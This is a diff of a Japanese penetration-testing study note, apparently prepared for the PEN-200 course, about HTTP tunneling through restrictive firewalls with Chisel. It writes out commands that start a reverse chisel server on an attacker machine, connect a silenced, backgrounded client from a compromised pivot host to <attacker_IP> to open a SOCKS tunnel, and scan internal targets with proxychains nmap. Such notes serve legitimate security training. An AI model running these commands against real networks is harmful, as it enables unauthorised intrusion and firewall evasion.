@@ -19,13 +19,9 @@
 
 ## HTTP Tunnelingの原理
 
-- 下図のように、HTTPのインバウンド通信のみが許可されている状況では、SSH通信によるポートフォワーディングも、リバースシェルの確立もできない
+- 多くの現実的な構成として、HTTPのインバウンド通信のみが許可されている状況では、SSH通信によるポートフォワーディングも、リバースシェルの確立もできない
 - ここで、HTTPでトンネリングすることで、ローカルNW上にアクセスすることが可能になる
 	- SSH通信をHTTPでカプセル化するなども可能
-
-![](../../../画像ファイル/Pasted%20image%2020250926065949.png)
-
-$$FWとINSPECTORによりマシンが保護されているイメージ図(PEN-200)$$
 
 ---
 
@@ -40,7 +36,7 @@ $$FWとINSPECTORによりマシンが保護されているイメージ図(PEN-20
 
 ### ChiselによるHTTP Tunneling(リモートポートフォワーディング)
 
-1. 足場(chisel client)がWindowsの場合は[Chisel release page - Github](https://github.com/jpillora/chisel/releases)のAssetsからアーキテクチャに応じたバイナリ（`.gz`ファイル）をダウンロードし、Linuxの場合は以下のコマンドでchiselをダウンロード
+1. 足場(chisel client)がWindowsの場合は🔗[Chisel release page - Github](https://github.com/jpillora/chisel/releases)のAssetsからアーキテクチャに応じたバイナリ（`.gz`ファイル）をダウンロードし、Linuxの場合は以下のコマンドでchiselをダウンロード
 ```zsh
 sudo apt install chisel
 ```
@@ -49,56 +45,48 @@ sudo apt install chisel
 
 3. chisel server(攻撃者マシン)を起動
 ```zsh
-chisel server --port <バインドポート> --reverse
+chisel server --port <bind_port> --reverse
 ```
-- `バインドポート`：chisel接続用のポートで、1025以上任意
+- `bind_port`：chisel接続用のポートで、1025以上任意
 
-4. chisel serverへの通信を確認できるようにしておく
-```zsh
-sudo tcpdump -nvvvXi tun0 tcp port <バインドポート>
-```
-
-5. 足場のマシン(chisel client)上で、トンネルを作成する
+4. 足場のマシン(chisel client)上で、トンネルを作成する
 ```zsh
 # Dynamic Port Forwardingの場合
-chisel client <attacker_IP>:<バインドポート> R:socks > /dev/null 2>&1 &
+chisel client <attacker_IP>:<bind_port> R:socks > /dev/null 2>&1 &
 ```
 ```zsh
 # 単純なリモートポートフォワーディングの場合
-chisel client <attacker_IP>:<バインドポート> R:<dest_port>:<dest_IP>:<dest_Port> &
+chisel client <attacker_IP>:<bind_port> R:<dest_port>:<target_IP>:<port> &
 ```
-- `R:`：dest_IPに127.0.0.1と指定すれば、ターゲットのローカルサービスへアクセスできる
-- 一方で、ポート番号ではなく`socks`と指定すれば、1080番ポートにSOCKSプロキシを立て、Dynamic Port Forwardingが可能になる
-- `> /dev/null 2>&1 &`：[スクリプト・コマンド・シェル操作](../../Common/スクリプト・コマンド・シェル操作.md#シェル(`sh`系)の特殊記号一覧表)
+- `R:`：
+	- target_IPに127.0.0.1と指定すれば、ターゲットのローカルサービスへアクセスできる
+	- ポート番号ではなく`socks`と指定すれば、1080番ポートにSOCKSプロキシを立て、Dynamic Port Forwardingが可能になる
+- `> /dev/null 2>&1 &`：エラー含むすべての入出力をリダイレクトする（[スクリプト・コマンド・シェル操作](../../Common/スクリプト・コマンド・シェル操作.md#シェル(`sh`系)の特殊記号一覧表)）
 
-6. 成功すればchisel server(攻撃者マシン)に以下のように表示される
+5. 成功すればchisel server(攻撃者マシン)に以下のように表示される
 ```
 2025/09/27 12:41:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
 ```
-- また`tcpdump`にも"Websocket"の文字列が確認できる
-	- →失敗したとき：[スクリプト・コマンド・シェル操作](../../Common/スクリプト・コマンド・シェル操作.md#コマンドが動作しない原因を突き止める)
 
-7. 目的の操作をする
+6. 攻撃者のマシンから目的の操作をする
 ```sh
 # Nmap
-sudo proxychains nmap -sT -p- -Pn -n <TargetIP> [2>/dev/null]
+sudo proxychains nmap -sT -p- -Pn -n <target_IP> [2>/dev/null]
 ```
 - SOCK経由のSSHアクセスの場合：[22 - SSH](../../Ports%20-%20Service/22%20-%20SSH.md#SSHをSOCKSプロキシ経由で動かす)
-- `proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする
+
+>[!TIP]
+>`proxychains nmap`の速度が遅い場合は、Proxychainsの設定で以下の２つの値を小さくする。
 ```zsh
 # Some timeouts in milliseconds
 tcp_read_time_out 15000
 tcp_connect_time_out 8000
 ```
-↓
+	↓
 ```zsh
 tcp_read_time_out 1200
 tcp_connect_time_out 800
 ```
-
->[!WARNING] 注意
->- socksを使うときは `/etc/proxychains4.con`に`socks5 127.0.0.1 1080`の設定を入れること
->- Proxychains は sudo と一緒に使う
 
 ---
 
